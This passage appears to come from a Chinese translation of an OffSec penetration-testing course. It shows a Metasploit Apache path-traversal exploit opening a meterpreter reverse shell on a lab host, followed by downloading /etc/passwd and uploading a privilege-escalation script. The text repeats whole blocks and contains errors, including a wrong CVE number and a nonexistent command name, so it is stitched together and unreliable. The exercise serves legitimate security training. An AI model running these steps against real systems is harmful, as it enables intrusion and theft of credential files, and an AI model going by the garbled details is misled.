
```
[+] Started TCP handler on 192.168.119.44:4444
[+] Using auxiliary/scanner/http/apache_normalize_path as check - 目标存在 CVE-2021-12013 漏洞，mod_cgi 已启用
[+] Scanned 1 of 1 hosts (100% complete)
[+] http://192.168.50.16:80 - 尝试利用
[+] http://192.168.50.16:80 - 正在 linux/x64/meterpreter_reverse_tcp 命令负载
[+] Meterpreter session 4 opened (192.168.119.4:4444 -> 192.168.50.16:35538) at 2022-08-08 05:20:20 -0400
[!] 此漏洞可能需要手动清理目标上的 '/tmp/Gfrglhc'
```

`meterpreter > help`

# 核心命令

| 命令 | 描述 |
| --- | --- |
| `?` `background` | 帮助菜单当前会话后台化 |
| `channel` `close` | 显示信息或控制活动通道；关闭通道 |
| `info` | 显示 Post 模块的信息 |
| `load` | 加载一个或多个 meterpreter 扩展 |
| `run` `secure` `sessions` | 执行 meterpreter 脚本或 Post 模块；（重新）协商会话上的 TLV 包加密；快速切换到会话 |

# Stdapi: 系统命令

| 命令 | 描述 |
| --- | --- |
| `execute` | 执行命令 |
| `getenv` | 获取一个或多个环境变量值 |
| `getpid` | 获取当前进程标识符 |
| `getuid` | 获取服务器运行的用户 |
| `kill` | 终止进程 |

PWK - © 2023 OffSec Services Limited. 版权所有。

制作于摩洛哥

# OffSec

使用 Kali Linux 进行渗透测试

在选择 64 位非分阶段版本的 `meterpreter_reverse_tcp` 负载后，我们可以查看其选项。对于此特定负载，与之前使用的负载选项相同。

现在，让我们使用我们的 Meterpreter 负载运行漏洞模块，并获得一个 Meterpreter 命令提示符，我们将通过输入 `help` 显示所有命令。

```
msf6 exploit(multi/http/apache_normalize_path_rce) > run
```

```
[+] Started TCP handler on 192.168.119.44:4444
[+] Using auxiliary/scanner/http/apache_normalize_path as check - 目标存在 CVE-2021-12013 漏洞，mod_cgi 已启用
[+] Scanned 1 of 1 hosts (100% complete)
[+] http://192.168.50.16:80 - 尝试利用
[+] http://192.168.50.16:80 - 正在发送 linux/x64/meterpreter_reverse_tcp 命令负载
[+] Meterpreter session 4 opened (192.168.119.4:4444 -> 192.168.50.16:35538) at 2022-08-08 05:20:20 -0400
[!] 此漏洞可能需要手动清理目标上的 '/tmp/Gfrglhc'
```

`meterpreter > help`

# 核心命令

| 命令 | 描述 |
| --- | --- |
| `?` `background` | 帮助菜单当前会话后台化 |
| `channel` `close` | 显示信息或控制活动通道；关闭通道 |
| `info` | 显示 Post 模块的信息 |
| `load` | 加载一个或多个 meterpreter 扩展 |
| `run` `secure` `sessions` | 执行 meterpreter 脚本或 Post 模块；（重新）协商会话上的 TLV 包加密；快速切换到会话 |

# Stdapi: 系统命令

| 命令 | 描述 |
| --- | --- |
| `execute` | 执行命令 |
| `getenv` | 获取一个或多个环境变量值 |
| `getpid` | 获取当前进程标识符 |
| `getuid` | 获取服务器运行的用户 |
| `kill` | 终止进程 |

PWK - © 2023 OffSec Services Limited. 版权所有。

制作于摩洛哥

# OffSec

使用 Kali Linux 进行渗透测试

在选择 64 位非分阶段版本的 `meterpreter_reverse_tcp` 负载后，我们可以查看其选项。对于此特定负载，与之前使用的负载选项相同。

现在，让我们使用我们的 Meterpreter 负载运行漏洞模块，并获得一个 Meterpreter 命令提示符，我们将通过输入 `help` 显示所有命令。

```
msf6 exploit(multi/http/apache_normalize_path_rce) > run
```

| 命令 | 描述 |
| --- | --- |
| `cat` | 将文件内容显示到屏幕 |
| `cd` | 切换目录 |
| `checksum` | 获取文件的校验和 |
| `chmod` | 修改文件权限 |
| `cp` | 复制源到目标 |
| `del` | 删除指定的文件 |
| `dir` | 列出文件 (ls 的别名) |
| `download` | 下载文件或目录 |
| `edit` | 编辑文件 |
| `getwld` | 输出工作目录 |
| `getwd` | 输出工作目录 |
| `lcat` | 将文件内容显示到屏幕 |
| `lcd` | 切换本地工作目录 |
| `ls` | 列出本地文件 |
| `lpwd` | 输出工作目录 |
| `ls` | 列出文件 |
| `mkdir` | 创建目录 |
| `mv` | 移动源到目标 |
| `pwd` | 输出工作目录 |
| `rm` | 删除指定的文件 |
| `rmdir` | 删除目录 |
| `search` | 搜索文件 |

# OffSec 文件或目录

`upload` Upload

列表 656 - 列出 Meterpreter 的所有文件系统命令

列表 656 向我们展示了可以用于在本地和目标系统上上传、下载或管理文件的各种命令。在本地系统（在本例中为我们的 Kali 虚拟机）上使用以 `"-"` 为前缀的命令。例如，我们使用这些命令来更改想要下载或上传文件的目录。

让我们从目标机器将 `/etc/passwd` 下载到我们的 Kali 系统。为此，我们首先将本地目录更改为 `/home/kali/Downloads`。然后，输入下载命令并将 `/etc/passwd` 作为参数。

```
meterpreter > pwd

/home/kali/

meterpreter > lcd /home/kali/Downloads

meterpreter > pwd

/home/kali/Downloads

meterpreter > download /etc/passwd

[*] Downloading: /etc/passwd -> /home/kali/Downloads/passwd

[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd -> /home/kali/Downloads/passwd

[*] download : /etc/passwd -> /home/kali/Downloads/passwd

meterpreter > lcat /home/kali/Downloads/passwd

root:x:0:0:root:/bin/bash
```

列表 657 - 更改本地目录并从目标机器下载 `/etc/passwd`

列表 657 显示我们成功地将 `/etc/passwd` 下载到了本地机器。

接下来，让我们尝试像在权限模块中那样运行 `unix-privesc-check™` 来寻找权限提升向量。让我们将目标系统上的文件更新到 `/tmp`。

```
meterpreter > upload /usr/bin/unix-privesc-check /tmp/

[*] uploading : /usr/bin/unix-privesc-check -> /tmp/

[*] uploaded : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check

meterpreter > ls /tmp

Listing: /tmp
============
